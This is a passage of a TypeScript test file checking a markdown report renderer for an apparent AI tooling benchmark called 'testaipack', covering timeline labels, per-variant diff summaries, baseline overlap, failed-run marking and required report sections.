  it('events are labeled by variant and run', () => {
    const md = renderMd(threeVariantsReport())
    expect(md).toMatch(/- \[(base|graphify|astgrep)\/run-1\] `[a-z-]+`.*: \d+ms/)
  })

  it('no events → placeholder', () => {
    const report = threeVariantsReport()
    const empty: Report = { ...report, timeline: { lanes: [], mode: 'side-by-side' } }
    expect(renderMd(empty)).toContain('_No timeline events._')
  })
})

// ---------------------------------------------------------------------------
// Diff summary — per-variant totals, overlap vs baseline
// ---------------------------------------------------------------------------

describe('renderMd — diff summary', () => {
  it('one totals line per variant (baseline included)', () => {
    const md = renderMd(threeVariantsReport())
    expect(md).toMatch(/- \*\*base\*\*: \+\d+ -\d+/)
    expect(md).toMatch(/- \*\*graphify\*\*: \+\d+ -\d+/)
    expect(md).toMatch(/- \*\*astgrep\*\*: \+\d+ -\d+/)
  })

  it('overlap vs baseline renders Both/Only base/Only {v} per non-baseline variant', () => {
    const md = renderMd(threeVariantsReport())
    expect(md).toContain('- **Overlap vs base (graphify)**')
    expect(md).toContain('- **Overlap vs base (astgrep)**')
    expect(md).toContain('  - Both:')
    expect(md).toContain('  - Only base:')
    expect(md).toContain('  - Only graphify:')
    expect(md).toContain('  - Only astgrep:')
    expect(md).not.toContain('- **Overlap vs base (base)**')
  })

  it('a run contained as failed is marked distinct from a genuine zero-change run', () => {
    const report = threeVariantsReport()
    const contained: Report = {
      ...report,
      metrics: {
        ...report.metrics,
        variants: report.metrics.variants.map((v) =>
          v.variant === 'astgrep' ? { ...v, failedRuns: [{ variant: 'astgrep', runIndex: 1, errorCode: 'E_PACK_EXERCISE_FAILED', errorMessage: 'x', timestamp: '2025-01-01T00:00:00.000Z' }] } : v,
        ),
      },
    }
    const md = renderMd(contained)
    expect(md).toContain('**contained as failed** (`E_PACK_EXERCISE_FAILED`; excluded from the Efficiency ratio below — see Failed runs)')
  })
})

// ---------------------------------------------------------------------------
// Full render smoke tests
// ---------------------------------------------------------------------------

describe('renderMd — full render', () => {
  it('threeVariants: renders every mandatory section, no stray section separators around empty sections', () => {
    const md = renderMd(threeVariantsReport())
    for (const heading of ['# testaipack report', '## Summary', '## Primary metrics', '## Secondary metrics', '## LLM Judge', '## Timeline summary', '## Diff summary']) {
      expect(md).toContain(heading)
    }
    expect(md).not.toContain('\n\n---\n\n\n\n---\n\n')
    expect(md.endsWith('\n')).toBe(true)
  })

  it('shimPair: renders every mandatory section for the 2-variant backward-compat path', () => {
    const md = renderMd(shimReport())
    for (const heading of ['# testaipack report', '## Summary', '## Primary metrics', '### vs base: new', '## Secondary metrics', '## LLM Judge', '## Diff summary']) {
      expect(md).toContain(heading)
    }
  })
})
